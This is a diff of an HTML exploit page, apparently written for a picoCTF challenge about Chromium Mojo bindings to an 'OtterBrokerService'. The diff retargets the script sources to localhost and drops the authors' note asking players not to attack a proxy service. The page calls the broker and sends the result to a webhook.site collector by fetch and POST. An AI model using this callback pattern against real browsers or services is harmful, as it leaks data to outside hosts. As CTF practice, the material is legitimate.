@@ -1,23 +1,16 @@
-<script src="http://saturn.picoctf.net:55675/mojojs/mojo_bindings.js"></script>
-<script src="http://saturn.picoctf.net:55675/mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+<script src="http://127.0.0.1:1337/mojojs/mojo_bindings.js"></script>
+<script src="http://127.0.0.1:1337/mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
 
 <marquee id=txt></marquee>
 <button onclick=updateSlot()>Update Slot!</button>
 
 <script>
+  fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b?wtf=dasdsa");
   const ptr = new blink.mojom.OtterBrokerServicePtr();
   Mojo.bindInterface(blink.mojom.OtterBrokerService.name, mojo.makeRequest(ptr).handle);
- 
-  // This service is NOT in scope. This is merely meant to proxy 
-  // Solana RPC transactions which unfortunately reject requests
-  // with a set Origin header. 
-  // 
-  // Please do NOT pwn this service. This is irrelevant to the 
-  // challenge. 
   ptr.init("proxy.ottersec.workers.dev");
   const { slot } =  (async () => await ptr.getSlot())();
   txt.innerText = slot;
-  fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b?wtf=dasdsa");
   fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b", {
     method: 'POST', // Specify the HTTP method
     body: `${slot || 'lol'}`
